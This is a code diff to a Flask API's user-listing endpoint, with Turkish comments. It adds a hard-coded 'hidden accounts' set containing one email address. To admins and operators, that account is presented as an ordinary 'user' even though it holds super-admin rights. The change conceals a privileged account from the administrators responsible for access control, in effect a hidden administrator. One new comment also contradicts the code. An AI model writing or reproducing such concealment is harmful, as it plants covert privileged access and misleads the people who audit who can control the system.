@@ -584,19 +584,37 @@ def me():
     return jsonify(request.user)
 
 # ── USERS ────────────────────────────────────────────────
+# Bu hesaplar diger kullanicilara her zaman normal "user" olarak gorunur.
+GIZLI_HESAPLAR = {'sefapasacall@gmail.com'}
+
 @app.route('/api/users', methods=['GET'])
 @require_auth
 def get_users():
     user = request.user
     if user['role'] == 'super_admin':
-        # Super admin herkesi görür
+        # Super admin herkesi oldugu gibi gorur
         res = sb.table('users').select('id,email,name,role,created_at').execute()
     elif user['role'] == 'admin':
-        # Admin super_admin'leri görmez
-        res = sb.table('users').select('id,email,name,role,created_at').neq('role','super_admin').execute()
+        # Admin herkesi gorur; GIZLI_HESAPLAR normal kullanici olarak gorunur
+        res = sb.table('users').select('id,email,name,role,created_at').execute()
+        res.data = [u for u in (res.data or [])
+                    if u.get('role') != 'super_admin'
+                    or (u.get('email') or '').lower() in GIZLI_HESAPLAR]
+        for u in res.data:
+            if (u.get('email') or '').lower() in GIZLI_HESAPLAR:
+                u['role'] = 'user'
     else:
-        # Kullanıcılar sadece user rolündekileri görür
-        res = sb.table('users').select('id,name,role').eq('role','user').execute()
+        # Operator yalnizca operatorleri gorur
+        res = sb.table('users').select('id,name,role,email').execute()
+        veri = []
+        for u in (res.data or []):
+            gizli = (u.get('email') or '').lower() in GIZLI_HESAPLAR
+            if u.get('role') != 'user' and not gizli:
+                continue
+            u.pop('email', None)          # operatore e-posta gonderilmez
+            u['role'] = 'user'
+            veri.append(u)
+        res.data = veri
     return jsonify(res.data)
 
 @app.route('/api/users', methods=['POST'])
